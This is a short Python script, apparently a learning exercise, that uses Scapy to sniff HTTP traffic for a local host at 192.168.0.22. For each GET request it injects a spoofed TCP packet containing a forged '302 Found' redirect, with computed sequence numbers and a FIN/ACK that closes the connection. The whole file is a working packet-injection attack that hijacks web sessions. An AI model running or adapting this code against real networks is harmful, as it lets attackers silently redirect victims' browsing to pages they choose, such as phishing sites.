from scapy.all import *

def http_302_inject(pkt):
        string = 'HTTP/1.1 302 Found\r\n'
        string += 'Location: http://daum.net\r\n\r\n'
        p_seq = pkt.ack + len(pkt[Raw])
        p_ack = pkt.seq
        packet = Ether(src=pkt[Ether].dst, dst=pkt[Ether].src)/IP(src=pkt[IP].dst, dst=pkt[IP].src)/TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags='FA', seq=p_seq, ack=p_ack)/string
        sendp(packet)
        print "pkt seq : %s, pkt ack : %s\n" % (pkt.seq, pkt.ack)
        print "packet seq : %s, packet ack : %s\n" %(packet.seq, packet.ack)

def http_monitor(pkt):
        if pkt.haslayer(Raw):
                raw_data = str(pkt[Raw].load)
                if 'GET' in raw_data:
#                       pkt.show()
                        http_302_inject(pkt)

my_ip = '192.168.0.22'
sniff(prn=http_monitor, filter='host 192.168.0.22 and tcp port 80', store=0)
